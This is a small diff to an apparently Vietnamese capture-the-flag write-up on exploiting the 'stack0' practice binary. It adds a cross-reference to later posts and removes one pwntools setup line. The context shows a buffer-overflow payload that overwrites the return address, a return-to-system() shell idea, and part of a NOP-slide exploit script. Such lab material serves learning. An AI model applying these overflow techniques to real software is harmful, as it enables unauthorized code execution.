@@ -29,6 +29,8 @@ payload: `python -c 'print "a"*80 + "\x19\x84\x04\x08"' | ./stack0`
 
 ## Spawn Shell
 
+chi tiết 2 cách làm bên dưới có ở bài stack 5 và stack 6.
+
 ### return về hàm system()
 
 thay vì để jump về `0x08048419` ta có thể return về hàm system() để spawn shell.
@@ -63,7 +65,6 @@ Check qua phân vùng stack, mình thấy nó có quyền excute. Nên mình s�
 ```python
 #!/usr/bin/python3
 from pwn import *
-elf = context.binary = ELF('./stack0')
 
 padding = b'a'*80
 eip = p32(0xffffd250+100) # esp addr + offset nop_slide
